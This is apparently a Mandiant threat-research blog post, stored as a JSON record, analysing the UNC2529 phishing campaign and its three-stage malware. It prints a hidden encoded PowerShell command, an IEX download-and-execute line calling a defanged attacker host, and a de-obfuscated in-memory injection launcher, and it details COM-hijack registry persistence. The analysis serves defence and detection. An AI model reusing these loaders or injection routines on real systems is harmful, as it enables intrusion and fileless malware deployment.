{
    "id": "72b179d0-641c-4eed-a937-8d9f5b0ff071",
    "created_at": "2023-01-12T15:08:44.390189Z",
    "updated_at": "2025-03-27T02:05:25.294219Z",
    "deleted_at": null,
    "sha1_hash": "c2a4d6e46d496fa0885320b84e3b8db4b7771841",
    "title": "2021-05-04 - The UNC2529 Triple Double- A Trifecta Phishing Campaign",
    "authors": "",
    "file_creation_date": "2022-05-28T18:21:58Z",
    "file_modification_date": "2022-05-28T18:21:58Z",
    "file_size": 162977,
    "plain_text": "# The UNC2529 Triple Double: A Trifecta Phishing Campaign\n\n**[fireeye.com/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign.html](https://www.fireeye.com/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign.html)**\n\nThreat Research\n\nNick Richard, Dimiter Andonov\n\nMay 04, 2021\n\n25 mins read\n\nThreat Actors\n\nUncategorized Groups (UNC Groups)\n\n\n-----\n\nIn December 2020, Mandiant observed a widespread, global phishing campaign targeting\nnumerous organizations across an array of industries. Mandiant tracks this threat actor as\n[UNC2529. Based on the considerable infrastructure employed, tailored phishing lures and](https://www.fireeye.com/blog/products-and-services/2020/12/how-mandiant-tracks-uncategorized-threat-actors.html)\nthe professionally coded sophistication of the malware, this threat actor appears experienced\nand well resourced. This blog post will discuss the phishing campaign, identification of three\nnew malware families, DOUBLEDRAG, DOUBLEDROP and DOUBLEBACK, provide a deep\ndive into their functionality, present an overview of the actor’s modus operandi and our\nconclusions. A future blog post will focus on the backdoor communications and the\ndifferences between DOUBLEBACK samples to highlight the malware evolution.\n\n**UNC2529 Phishing Overview**\n\nMandiant observed the first wave of the phishing campaign occur on Dec. 2, 2020, and a\nsecond wave between Dec. 11 and Dec. 18, 2020.\n\nDuring the initial flurry, Mandiant observed evidence that 28 organizations were sent phishing\nemails, though targeting was likely broader than directly observed. These emails were sent\nusing 26 unique email addresses associated with the domain tigertigerbeads<.>com, and in\nonly a small number of cases did we see the same address used across multiple recipient\norganizations. These phishing emails contained inline links to malicious URLs such as,\nhxxp://totallyhealth-wealth[.]com/downld-id_mw<redacted>Gdczs, engineered to entice the\nvictim to download a file. UNC2529 employed at least 24 different domains to support this\nfirst, of a three-stage process.\n\nThe structure of URLs embedded in these phishing emails had the following patterns, where\nthe string was an alphabetic variable of unknown function.\n\nhttp://<fqdn>/downld-id_<string>\n\nhttp://<fqdn>/downld-id-<string>\n\nhttp://<fqdn>/files-upload_<string>\n\nhttp://<fqdn>/files-upload-<string>\n\nhttp://<fqdn>/get_file-id_<string>\n\nhttp://<fqdn>/get_file-id-<string>\n\nhttp://<fqdn>/zip_download_<string>\n\nhttp://<fqdn>/zip_download-<string>\n\nThe first stage payload downloaded from these URLs consisted of a Zip compressed file\ncontaining a corrupt decoy PDF document and a heavily obfuscated JavaScript downloader.\nMandiant tracks the downloader as DOUBLEDRAG. Interestingly, the PDF documents were\nobtained from public websites, but corrupted by removing bytes to render them unreadable\nwith a standard PDF viewer. It is speculated that the victim would then attempt to launch the\nJavaScript (.js) file, which can be executed natively with Windows Script Host by simply\n\n\n-----\n\ndouble clicking on the file. All but one of the file name patterns for the ZIP, PDF and JS files\nwere document_<state>_client-id_<4 digit number>.extension, such as\n“document_Ohio_client-id_8902.zip”.\n\nEach of the observed DOUBLEDRAG downloaders used in the first wave attempted to\ndownload a second-stage memory-only dropper, which Mandiant tracks as DOUBLEDROP,\nfrom either hxxp://p-leh[.]com/update_java.dat or hxxp://clanvisits[.]com/mini.dat. The\ndownloaded file is a heavily obfuscated PowerShell script that will launch a backdoor into\nmemory. Mandiant tracks this third-stage backdoor as DOUBLEBACK. DOUBLEBACK\nsamples observed during the phishing campaign beaconed to\nhxxps://klikbets[.]net/admin/client.php and hxxps://lasartoria[.]net/admin/client.php.\n\nPrior to the second wave, observed between Dec. 11 and Dec. 18, 2020, UNC2529 hijacked\na legitimate domain owned by a U.S. heating and cooling services company, modified DNS\nentries and leveraged that infrastructure to phish at least 22 organizations, five of which were\nalso targeted in the first wave. It is not currently known how the legitimate domain was\ncompromised. The threat actor used 20 newly observed domains to host the second-stage\npayload.\n\nThe threat actor made slight modifications to the URL pattern during the second wave.\n\nhttp://<fqdn>/<string>\nhttp://<fqdn>/dowld_<string>\nhttp://<fqdn>/download_<string>\nhttp://<fqdn>/files_<string>\nhttp://<fqdn>/id_<string>\nhttp://<fqdn>/upld_<string>\n\nOf note, the DOUBLEDRAG downloader observed in the first wave was replaced with a\nMicrosoft Excel document containing an embedded legacy Excel 4.0 (XLM) macro in Excel\n97-Excel 2003 Binary file format (BIFF8). When the file was opened and the macro executed\nsuccessfully, it would attempt to download a second-stage payload from\nhxxps://towncentrehotels[.]com/ps1.dat. The core functionality of the DOUBLEDRAG\nJavaScript file and the BIFF8 macro is to download a file from a hardcoded URL. This Excel\nfile was also found within Zip files, as seen in the first wave, although only one of the\nobserved Zip files included a corresponding corrupt decoy PDF document.\n\nAdditional DOUBLEBACK samples were extracted from DOUBLEDROP samples uploaded\nto a public malware repository, which revealed additional command and control servers (C2),\nhxxps://barrel1999[.]com/admin4/client.php, hxxps://widestaticsinfo[.]com/admin4/client.php,\nhxxps://secureinternet20[.]com/admin5/client.php, and\nhxxps://adsinfocoast[.]com/admin5/client.php. Three of these domains were registered after\nthe observed second wave.\n\n\n-----\n\n**Tailored Targeting**\n\nUNC2529 displayed indications of target research based on their selection of sender email\naddresses and subject lines which were tailored to their intended victims. For example,\nUNC2529 used a unique username, masquerading as an account executive for a small\nCalifornia-based electronics manufacturing company, which Mandiant identified through a\nsimple Internet search. The username of the email address was associated with both sender\ndomains, tigertigerbeads<.>com and the compromised HVAC company. Masquerading as\nthe account executive, seven phishing emails were observed targeting the medical industry,\nhigh-tech electronics, automotive and military equipment manufacturers, and a cleared\ndefense contractor with subject lines very specific to the products of the California-based\nelectronics manufacturing company.\n\nAnother example is a freight / transport company that received a phish with subject,\n“compton ca to flowery branch ga”, while a firm that recruits and places long-haul truck\ndrivers received a simple, “driver” in the subject line.\n\nA utility company received a phish with subject, “easement to bore to our stairwell area.”\n\nWhile not all financial institutions saw seemingly tailored subjects, numerous appeared fairly\nunique, as shown in Table 1.\n\nSubject Lure Wave\n\nre: <redacted> outdoors environment (1 out of 3) 1st\n\naccepted: follow up with butch & karen 1st\n\nre: appraisal for <redacted> - smysor rd 2nd\n\nre: <redacted> financing 2nd\n\nTable 1: Sample financial industry subject lures\n\nSeveral insurance companies that were targeted saw less specific subjects, but still\nappropriate for the industry, such as those in Table 2.\n\nSubject Lure Wave\n\nfw: certificate of insurance 1st\n\n\n-----\n\nfw: insurance for plow 1st\n\nplease get this information 1st\n\nquestion & number request 1st\n\nclaim status 2nd\n\napplications for medicare supplement & part d 2nd\n\nTable 2: Sample insurance industry subject lures\n\nInterestingly, one insurance company with offices in eastern Texas received a phish with a\nsubject related to a local water authority and an ongoing water project. While no public\ninformation was found to tie the company to the other organization or project, the subject\nappeared to be very customized.\n\nSome patterns were observed, as seen in Table 3. Additionally, UNC2529 targeted the same\nIT services organization in both waves using the same lure (1 and 5 in Table 3). Most of the\nphishing emails with lures containing “worker” targeted U.S. organizations. As “worker” isn’t a\ncommon way to refer to an employee in the U.S., this may indicate a non-native American\nEnglish speaker.\n\nSubject Lure Wave\n\ndear worker, your work # ujcb0utczl 1st\n\ngood day worker, your job number- 8ldbsq6ikd 1st\n\nhello worker, your work number- u39hbutlsf 1st\n\ngood day candidate, your vacancy # xcmxydis4s 2nd\n\ndear worker, your work # ujcb0utczl 2nd\n\nTable 3: Sample pattern subject lures\n\n**Industry and Regional Targeting**\n\n\n-----\n\nUNC2529 s phishing campaign was both global and impacted an array of industries (Industry\nand Regional Targeting graphics are greater than 100% due to rounding). While\nacknowledging some telemetry bias, in both waves the U.S. was the primary target, while\ntargeting of EMEA and Asia and Australia were evenly dispersed in the first wave, as shown\nin Figure 1.\n\n\nUNC2529 phishing campaign, first wave\n\n\nFigure 1: UNC2529 phishing campaign, first wave\nIn the second wave, EMEA’s percentage increased the most, while the U.S. dropped slightly,\nand Asia and Australia remained at close to the same level, as illustrated in Figure 2.\n\n\n-----\n\nUNC2529 phishing campaign, second wave\n\n\nFigure 2: UNC2529 phishing campaign, second wave\nAlthough Mandiant has no evidence about the objectives of this threat actor, their broad\ntargeting across industries and geographies is consistent with a targeting calculus most\ncommonly seen among financially motivated groups.\n\n**Technical Analysis**\n\nOverview\n\nThe Triple DOUBLE malware ecosystem consists of a downloader (DOUBLEDRAG) (or\nalternatively an Excel document with an embedded macro), a dropper (DOUBLEDROP), and\na backdoor (DOUBLEBACK). As described in the previous section, the initial infection vector\nstarts with phishing emails that contain a link to download a malicious payload that contains\nan obfuscated JavaScript downloader. Once executed, DOUBLEDRAG reaches out to its C2\nserver and downloads a memory-only dropper. The dropper, DOUBLEDROP, is implemented\nas a PowerShell script that contains both 32-bit and 64-bit instances of the backdoor\n\n\n-----\n\nDOUBLEBACK. The dropper performs the initial setup that establishes the backdoor s\npersistence on the compromised system and proceeds by injecting the backdoor into its own\nprocess (PowerShell.exe) and then executing it. The backdoor, once it has the execution\ncontrol, loads its plugins and then enters a communication loop, fetching commands from its\nC2 server and dispatching them. One interesting fact about the whole ecosystem is that only\nthe downloader exists in the file system. The rest of the components are serialized in the\nregistry database, which makes their detection somewhat harder, especially by file-based\nantivirus engines.\n\n**Ecosystem in Details**\n\nDOUBLEDRAG Downloader component\n\nThe downloader is implemented as a heavily obfuscated JavaScript code. Despite the\nrelatively large amount of the code, it boils down to the following snippet of code (Figure 3),\nafter de-obfuscation.\n\n\"C:\\Windows\\System32\\cmd.exe\" /c oqaVepEgTmHfPyC & Po^wEr^sh^elL -nop -w hidden\n-ep bypass -enc <base64_encoded_ps_code>\n\nFigure 3: De-obfuscated JavaScript downloader\n\nThe <base64_encoded_ps_code> downloads and executes a PowerShell script that\nimplements the DOUBLEDROP dropper. Note, that the downloaded dropper does not touch\nthe file system and it is executed directly from memory. A sanitized version of the code,\nobserved in the first phishing wave, is shown in Figure 4.\n\nIEX (New-Object Net.Webclient).downloadstring(\"hxxp://p-leh[.]com/update_java.dat\")\n\nFigure 4: Downloading and executing of the DOUBLEDROP dropper\n\n**DOUBLEDROP Dropper component**\n\nOverview\n\nThe dropper component is implemented as an obfuscated in-memory dropper written in\nPowerShell. Two payloads are embedded in the script—the same instances of the\nDOUBLEBACK backdoor compiled for 32 and 64-bit architectures. The dropper saves the\nencrypted payload along with the information related to its decryption and execution in the\ncompromised system’s registry database, effectively achieving a file-less malware execution.\n\nSetup\n\nThe dropper's main goal is to serialize the chosen payload along with the loading scripts into\nthe compromised system's registry database and to ensure that the payload will be loaded\nfollowing a reboot or a user login (see the Persistence Mechanism section). In order to do so,\n\n\n-----\n\nthe dropper generates three pseudo-random GUIDs and creates the registry keys and values\nshown in Figure 5.\n\n - HK[CU|LM]\\Software\\Classes\\CLSID\\{<rnd_guid_0>}\n - key: LocalServer\n - value: <default>\n - data: <bootstrap_ps_code>\n - key: ProgID\n - value: <default>\n - data: <rnd_guid_1>\n - value: <last_4_chars_of_rnd_guid_0>\n - data: <encoded_loader>\n - key: VersionIndependentProgID\n - value: <default>\n - data: <rnd_guid_1>\n - value: <first_4_chars_of_rnd_guid_0>\n - data: <encoded_rc4_key>\n - value: <last_4_chars_of_rnd_guid_0>\n - data: <rc4_encrypted_payload>\n\n - HK[CU|LM]\\Software\\Classes\\{<rnd_guid_1>}\n - value: <default>\n - data: <rnd_guid_1>\n - key: CLSID\n - value: <default>\n - data: <rnd_guid_0>\n\n - HK[CU|LM]\\Software\\Classes\\CLSID\\{<rnd_guid_2>}\n - value: <default>\n - data: <rnd_guid_1>\n - key: TreatAs\n - value: <default>\n - data: <rnd_guid_0>\n\nFigure 5: Registry keys and values created by the dropper\n\nOnce the registry keys and values are created, the dropper dynamically generates the\nbootstrap and the launcher PowerShell scripts and saves them under the {<rnd_guid_0>}\nregistry key as shown in Figure 5. Additionally, at this point the dropper generates a random\nRC4 key and encodes it inside a larger buffer which is then saved under the\nVersionIndependentProgID key. The actual RC4 key within the buffer is given by the following\ncalculations, shown in Figure 6 (note that the key is reversed!).\n\n<relative_offset> = buffer[32]\nbuffer[32 + <relative_offset> + 1] = <reversed_rc4_key>\n\nFigure 6: Encoding of the RC4 key\n\n\n-----\n\nFinally, the dropper encrypts the payload using the generated RC4 key and saves it in the\nrespective value under the VersionIndependentProgId registry key (see Figure 5).\n\nAt this point all the necessary steps that ensure the payload's persistence on the system are\ncomplete and the dropper proceeds by directly executing the launcher script, so the backdoor\nreceives the execution control immediately. The persistence mechanism, the bootstrap, and\nthe launcher are described in more details in the following sections.\n\nPersistence Mechanism\n\nThe persistence mechanism implemented by the DOUBLEDROP sample is slightly different\ndepending on whether the dropper has been started within an elevated PowerShell process\nor not.\n\nIf the dropper was executed within an elevated PowerShell process, it creates a scheduled\ntask with an action specified as TASK_ACTION_COM_HANDLER and the class ID - the\n{<rnd_guid_2>} GUID (See Figure 5). Once executed by the system, the task finds the\n{<rnd_guid_2>} class under the HKLM\\Software\\Classes\\CLSID registry path, which in this\ncase points to an emulator class via the TreatAs registry key. The {<rnd_guid_0>} emulator\nclass ID defines a registry key LocalServer and its default value will be executed by the task.\n\nIf the dropper is started within a non-elevated PowerShell process, the sequence is generally\nthe same but instead of a task, the malware hijacks one of the well-known classes, Microsoft\nPlaySoundService ({2DEA658F-54C1- 4227-AF9B-260AB5FC3543}) or MsCtfMonitor\n({01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}), by creating an associated TreatAs\nregistry key under their definition in the registry database. The TreatAs key's default registry\nvalue points to the {<rnd_guid_0>} emulator class essentially achieving the same execution\nsequence as in the elevated privilege case.\n\nBootstrap\n\nThe bootstrap is implemented as an obfuscated PowerShell script, generated dynamically by\nthe dropper. The content of the code is saved under the emulator's class LocalServer registry\nkey and it is either executed by a dedicated task in case of a privileged PowerShell process\nor by the operating system that attempts to load the emulator for the PlaySoundService or\nMsCtfMonitor classes.\n\nThe bootstrap code finds the location of the launcher script, decodes it and then executes it\nwithin the same PowerShell process. A decoded and sanitized version of the script is shown\nin Figure 7.\n\n\n-----\n\n$enc = [System.Text.Encoding]::UTF8;\n$loader = Get-ItemProperty\n Path($enc.GetString([Convert]::FromBase64String('<base64_encoded_path_to_launcher>')))\n-n '<launcher_reg_val>' | Select-Object -ExpandProperty '<launcher_reg_val>';\n$xor_val = <xor_val>;\niex(\n$enc.GetString($(\nfor ($i = 0; $i -lt $loader.Length; $i++) {\nif ($xor_val -ge 250) {\n$xor_val = 0\n}\n$loader[$i] -bxor $xor_val;\n$xor_val += 4\n}\n))\n)\n\nFigure 7: De-obfuscated and sanitized bootstrap code\n\nNote that the actual values for <base64_encoded_path_to_launcher>, <launcher_reg_val>,\nand <xor_val> are generated on the fly by the dropper and will be different across the\ncompromised systems.\n\nThe encoding of the launcher is implemented as a simple rolling XOR that is incremented\nafter each iteration. The following code snippet (Figure 8) could be used to either encode or\ndecode the launcher, given the initial key.\n\ndef encdec(src, key):\nout = bytearray()\nfor b in src:\nif key >= 250:\nkey = 0\nout.append(b ^ key)\nkey += 4\nreturn out\n\nFigure 8: Algorithm to Decode the Launcher\n\nOnce the launcher is decoded it is executed within the same PowerShell process as the\nbootstrap by calling the iex (Invoke-Expression) command.\n\nLauncher\n\nThe launcher responsibility, after being executed by the bootstrap code, is to decrypt and\nexecute the payload saved under the VersionIndependentProgID registry key. To do so, the\nlauncher first decodes the RC4 key provided in the <first_4_chars_of_rnd_guid_0> value\n(see Figure 5) and then uses it to decrypt the payload. Once the payload is decrypted, the\n\n\n-----\n\nlauncher allocates virtual memory enough to house the image in memory, copies it there, and\nfinally creates a thread around the entry point specified in the dropper. The function at that\nentry point is expected to lay the image in memory, to relocate the image, if necessary, to\nresolve the imports and finally—to execute the payload's entry point.\n\nA sanitized and somewhat de-obfuscated version of the launcher is shown in Figure 9.\n\nfunction DecryptPayload {\nparam($fn7, $xf7, $mb5)\n$fn1 = Get-ItemProperty -Path $fn7 -n $mb5 | Select-Object -ExpandProperty $mb5;\n$en8 = ($fn1[32] + (19 + (((5 - 2) + 0) + 11)));\n$ow7 = $fn1[$en8..($en8 + 31)];\n[array]::Reverse($ow7);\n$fn1 = Get-ItemProperty -Path $fn7 -n $xf7 | Select-Object -ExpandProperty $xf7;\n$en8 = {\n$xk2 = 0..255;\n0..255 | % {\n$wn4 = ($wn4 + $xk2[$_] + $ow7[$_ % $ow7.Length]) % (275 - (3 + (11 + 5)));\n$xk2[$_], $xk2[$wn4] = $xk2[$wn4], $xk2[$_]\n};\n$fn1 | % {\n$sp3 = ($sp3 + 1) % (275 - 19);\n$si9 = ($si9 + $xk2[$sp3]) % ((600 - 280) - 64);\n$xk2[$sp3], $xk2[$si9] = $xk2[$si9], $xk2[$sp3];\n$_-bxor$xk2[($xk2[$sp3] + $xk2[$si9]) % (343 - ((1 + 0) + 86))]\n}\n};\n$ry6 = (& $en8 | foreach-object { '{0:X2}' -f $_ }) -join '';\n($(for ($sp3 = 0; $sp3 -lt $ry6.Length; $sp3 += 2) {\n[convert]::ToByte($ry6.Substring($sp3, 2), (17 - ((1 + 0))))\n}\n)\n)\n}\n\nfunction ExecuteApi {\nparam($fn7, $xf7)\n$vy9 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('?RND?')),\n\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('?RND?',\n$false).DefineType('?RND?', 'Class,Public,Sealed,AnsiClass,AutoClass',\n\n[System.MulticastDelegate]);\n$vy9.DefineConstructor('RTSpecialName,HideBySig,Public',\n\n[System.Reflection.CallingConventions]::Standard,\n$fn7).SetImplementationFlags('Runtime,Managed');\n$vy9.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $xf7,\n$fn7).SetImplementationFlags('Runtime,Managed');\n$vy9.CreateType()\n}\n\n\n-----\n\nfunction GetProcAddress {\nparam($fn7)\n$fq3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {\n$_.GlobalAssemblyCache -and $_.Location.Split('\\\\')[-1].Equals('System.dll')\n}).GetType('Microsoft.Win32.UnsafeNativeMethods');\n$lr3 = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),\n($fq3.GetMethod('GetModuleHandle').Invoke(0, @('kernel32.dll'))));\n$fq3.GetMethod('GetProcAddress', [reflection.bindingflags] 'Public,Static', $null,\n\n[System.Reflection.CallingConventions]::Any, @((New-Object\nSystem.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null,\n@([System.Runtime.InteropServices.HandleRef]$lr3, $fn7))\n}\n\n$decryptedPayload = DecryptPayload 'hklm:\\software\\classes\\CLSID\\\n<rnd_guid_0>\\VersionIndependentProgID' '<reg_val_payload>' '<reg_val_rc4_key>';\n\nfunction InjectPayload {\nparam($payload, $payloadLen, $entryPoint, $access)\n$mem =\n\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress\n'VirtualAllocEx'), (ExecuteApi @([IntPtr], [IntPtr], [IntPtr], [int], [int])([Intptr]))).invoke(-1, 0,\n$payloadLen, 0x3000, $access);\n\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress\n'RtlMoveMemory'), (ExecuteApi @([IntPtr], [byte[]], [UInt32])([Intptr]))).invoke($mem,\n$payload, $payloadLen);\n$mem = New-Object System.Intptr -ArgumentList $($mem.ToInt64() + $entryPoint);\n\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress\n'CreateThread'), (ExecuteApi @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])\n([Intptr]))).invoke(0, 0, $mem, 0, 0, 0);\nStart-Sleep -s (((2673 - 942) + 1271))\n}\n\n# 0x36dc = Loader Entry Point, rva\n# 0x40 = PAGE_EXECUTE_READWRITE\nInjectPayload $decryptedPayload $decryptedPayload.length 0x36dc 0x40\n\nFigure 9: De-obfuscated and sanitized launcher script\n\n**DOUBLEBACK Backdoor component**\n\nOverview\n\nThe observed DOUBLEDROP instances contain a well-designed backdoor implemented as a\n32 or 64-bit PE dynamic library which we track as DOUBLEBACK. The backdoor is initially\nmapped into the same PowerShell process started by the bootstrap script, but it will then\n\n\n-----\n\ninject itself into a msiexec.exe process if certain conditions are met. By design, the core of\nthe backdoor functionality is intended to be executed after injected into a newly spawned\nmsiexec.exe process.\n\nIn contrast with other backdoors DOUBLEBACK does not have its services hardcoded and\nthe functionality is expected to be implemented as plugins that are expected to be serialized\nin the registry database under a host-specific registry path. That way, the backdoor can be\nconfigured to implement a flexible set of services depending on the target. With all the\ncommon functionality implemented as plugins, the backdoor’s main goal is to establish a\ncommunication framework ensuring data integrity between the C2 server and the appropriate\nplugins.\n\nDetails\n\nThe backdoor starts by retrieving its process name and ensures that it is either\npowershell.exe or msiexec.exe. In all other cases, the malware will immediately terminate\nitself. Normally, when first started on the system, the backdoor will be injected into the same\nPowerShell process that executes both the bootstrap code and the launcher. In that mode\nthe malware may spawn (depending on certain conditions) a msiexec process and injects\nitself into it. More details about the logic implemented in the PowerShell and the msiexec\nbranches are provided in the following sections.\n\nNext, the backdoor ensures that it is the only DOUBLEBACK instance currently executing on\nthe compromised system. To do that, the malware generates a host-based pseudo-unique\nGUID and uses it as a mutex name. The algorithm first generates a pseudo-unique host\nidentifier that is based on the system volume's serial number and a hardcoded salt value, as\nshown in Figure 10.\n\n# oberserved salt = 0x436ea76d\ndef gen_host_id(vol_ser_num, salt):\nsalted_val = (vol_ser_num + salt) & 0xffffffff\nmd5 = hashlib.md5(bytes(salted_val.to_bytes(4, 'little')))\nsecond_dword = struct.unpack('<i', md5.digest())[0]\nreturn (salted_val + second_dword) & 0xffffffff\n\nFigure 10: Host ID generation algorithm\n\nNext, the malware passes the generated host ID to another algorithm that generates a\npseudo-unique GUID based on the input, as shown in Figure 11.\n\n\n-----\n\n# src is the host ID\ndef gen_guid(src):\nb = bytearray()\nxor = 0xaabbccdd\nfor _ in range(4):\nb += src.to_bytes(4, byteorder='little')\nsrc ^= xor\nxor = (xor + xor) & 0xffffffff\nreturn uuid.UUID(bytes_le=bytes(b))\n\nFigure 11: GUID generation algorithm\n\nOnce the GUID is generated the malware formats it as Global\\{<guid>} and attempts to open\na mutex with that name. In case the mutex is already created the backdoor assumes that\nanother instance of itself is already running and terminates itself. Otherwise, the backdoor\ncreates the mutex and branches out depending on the detected process it currently mapped\ninto.\n\n**Executing Within the PowerShell Process**\n\nThe initial state of the backdoor execution is when it is mapped into a PowerShell process\ncreated by the bootstrap code. In this mode, the backdoor attempts to relocate itself into a\nnew instance of msiexec.exe. Before the injection is attempted, the backdoor enumerates the\nrunning processes looking for Kaspersky Antivirus (avp.exe, avpui.exe) or BitDefender\n(bdagent.exe, bdservbdagent.exe, bdservicehost.exe) engines. This part of the functionality\nseems to be a work in progress because the malware ignores the fact if the Kaspersky\nsoftware is detected but it will not attempt injecting into the msiexec.exe process in case\nBitDefender is found running on the compromised system. In the latter case, the backdoor's\nmain functionality will be executed inside the same PowerShell process and no new instance\nof msiexec.exe will be created.\n\nThe injection process involves finding the backdoor's image under the appropriate registry\nkey. Note, that the backdoor instance we have observed in the first wave does not handle\nsituations when the malware ecosystem is installed as an administrator—such cases would\nend up with the backdoor not able to locate its image for injecting. In all other cases, the\nmalware starts with the well-known class GUIDs of the PlaySoundService and MsCtfMonitor\nclasses and attempts to find which of them has the TreatAs registry key under their definition.\nOnce the TreatAs key is found, its default registry value points to the registry key that has the\nRC4-encrypted backdoor image and the encoded RC4 key both described in the previous\nsection of the post.\n\nWith the backdoor image loaded in memory and decrypted, the malware spawns a\nsuspended process around msiexec.exe and inject its image into it. The backdoor PE file\nexports a single function that is used to lay down its own image in memory and execute its\n\n\n-----\n\nDllMain entry point. The export function allocates the needed memory, relocates the image, if\nneeded, resolves the imports and finally executes the backdoor’s DllMain function.\n\nAt this point the backdoor is running inside the hijacked msiexec.exe and the instance inside\nthe PowerShell process terminates itself.\n\n**Executing as Injected in the msiexec.exe Process**\n\nOverview\n\nThe DOUBLEBACK backdoor executes its main functionality while injected in a dedicated\nmsiexec.exe process (provided BitDefender AV is not found running on the system). The\nmain logical modules of the backdoor are its configuration, plugin management, and\ncommunications. In the following sections we will describe the first two, while a future blog\npost will focus on the communications and the evolution of the backdoor.\n\nConfiguration\n\nThe backdoor uses an embedded configuration that contains the C2 URLs and a key (more\nabout the key in the second part of the post). The configuration data is formatted as shown in\nFigure 12.\n\nstruct tag_config_header_t {\n\nuint32_t xor_val_1;\n\nuint32_t xor_val_2;\n\nuint32_t xor_val_3;\n\nuint32_t xor_val_4;\n\n} config_header_t;\n\nstruct tag_config_t {\n\nconfig_header_t header;\n\nuint8_t encoded_config[];\n\n} config_t;\n\nFigure 12: Encoded configuration format\n\nThe length of the encoded_config data is provided by the XOR-ing of the xor_val_1 and\nxor_val_2 fields of the config_header_t structure. The config_t.encoded_config blob can be\ndecoded by XOR-ing the data with the config_header_t.xor_val_1.\n\nThe decoded configuration data consists of a comma-separated list of URLs followed by a\nkey that is used in the communication module. The first two bytes specify the lengths of the\ncomma-separated URL list and the key, respectively. The URLs in the observed samples\nfollow the pattern shown in Figure 13.\n\nhttps://<server>/admin<n>/client.php\n\n\n-----\n\nFigure 13: Observed C2 URL pattern\n\nThe initial sample did not have any value for <n> but the samples after that were observed to\nuse <n> equal to 4 or 5.\n\nPlugin Management\n\nThe backdoor's core functionality is implemented via plugins designed as PE Windows\ndynamic libraries. The plugins, as with the other backdoor components, are also saved in the\nregistry database under a host-specific registry key. The full path to the plugins location is\nformatted as HK[LM|CU]:\\Software\\Classes\\CLSID\\{<plugins_home_guid>}, where\n<plugins_home_guid> is generated by the GUID algorithm shown in Figure 11 with a hostspecific value we call implant ID which is used not only to generate the path to the plugins\nbut with the backdoor’s C2 communications and it is also passed as a parameter to each of\nthe plugins during their initialization. The implant ID is generated by seeding the Linear\nCongruential Generator (LCG) algorithm, shown in Figure 14, with the host ID and the\n<max_range> value is set to 0x54c5638. The value generated by the LCG is then added to\n0x989680 and the result serves as the implant ID.\n\ndef lcg(max_range):\nglobal seed\nif seed == 0:\nseed = get_RDTSC()\nn = (0x7fffffed * seed + 0x7fffffc3) & 0xffffffff\nval = n % max_range\nseed = n\nreturn val\n\nFigure 14: Linear Congruential Generator used by the backdoor\n\nThe backdoor enumerates all the registry values under the plugins home location (the\nregistry value names are insignificant) and expects each of the plugins to be formatted, as\nshown in Figure 15.\n\n\n-----\n\nstruct tag_plugin_header_t {\nuint32_t xor_val;\nuint32_t param_2; the second parameter of the pfn_init\nuint32_t len_1;\nuint32_t len_2;\nuint32_t pfn_init;\nuint32_t pfn_cleanup;\nuint32_t param_3; the third parameter of the pfn_init\nuint32_t unused;\n} plugin_header_t;\n\nstruct tag_plugin_t {\nplugin_header_t header;\nuint8_t encoded_plugin[];\n} plugin_t;\n\nFigure 15: Encoded plugins format\n\nAs shown in Figure 15, the plugin data starts with a 32-byte long header followed by the\nencoded plugin DLL. The plugin encoding is implemented as a combination of rolling\nDWORD/BYTE XOR with initial value specified by the plugin_header_t.xor_val value. The\nplugin_header_t.len_1 stores the number of DWORDS to be decoded with\nplugin_header_t.xor_val which is incremented by 4 after each iteration. The\nplugin_header_t.len_2 specifies the number of bytes to be decoded at the current position\nafter the previous operation with the current value of the plugin_header_t.xor_val (only the\nleast significant byte is taken). In this mode the plugin_header_t.xor_val value is incremented\nby one after each iteration.\n\nThe plugins are expected to export at least two functions—one for initialization and another\nto clean up the resources before unloading. The initialization routine takes four parameters—\ntwo from the header and two calculated by the backdoor, as shown Figure 16.\n\npfn_init(implant_id, plugin_header_t.param_2, plugin_header_t.param_3,\np_plugin_image_in_memory)\n\nFigure 16: Plugins initialization routine prototype\n\nThe current backdoor's implementation provides support for up to 32 plugins with each of\nthem mapped and initialized in the backdoor's process space.\n\nAdditional Notes\n\nThe first backdoor instance we observed back in December 2020 was a stable and wellwritten code, but it was clearly a work in progress. For example, the early instance of the\nmalware spawns a thread to secure delete the DOUBLEDROP dropper from disk which\nindicates that an earlier variant of this malware launched a copy of the dropper from the file\n\n\n-----\n\nsystem. The dropper would save its current location on disk in the default registry value\nunder the HK[LM|CU]:\\Software\\Classes key. The backdoor spawns a dedicated thread that\nretrieves the dropper’s path and then proceeds to overwrite the image on disk with 0x00,\n0xFF, and a randomly generated byte before deleting the dropper from the file system.\n\nAdditionally, the early instance of the backdoor, as mentioned, would not handle the\nsituations when an elevated PowerShell process is used. The dropper would use a\nscheduled task in that case with the relevant registry keys created under the HKLM hive but\nthe backdoor does not support that case and will not be able to find its image under the\nspecific key in order to inject itself into the msiexec.exe process.\n\nFinally, the backdoor would output debug information in a few cases using the\nOutputDebugString API. Interestingly, the format and the generation of the log message is\n[the same as the one used in the publicly available PEGASUS code (preliminary technical](https://github.com/DeadNumbers/Pegasus/blob/f83159ebcc2b2ba429b23805fdc66ab3eb2959f5/Pegasus/inc/dbg.c)\nanalysis: Pegasus Malware Source Code). The PEGASUS backdoor is distributed with\nmodules that allow it to manipulate files generated by common Russian payment processing\nsoftware that is used to assess and process VAT refunds. When executed on a workstation\nrunning targeted software, the malware can attempt to add VAT to transactions that are\nnormally exempt and directs associated tax refunds to attacker-controlled bank accounts.\n\n**Conclusion**\n\nConsiderable resources were employed by UNC2529 to conduct their December phishing\ncampaign. Almost 50 domains supported various phases of the effort, targets were\nresearched, and a legitimate third-party domain was compromised. The threat actor made\nextensive use of obfuscation and fileless malware to complicate detection to deliver a well\ncoded and extensible backdoor. UNC2529 is assessed as capable, professional and 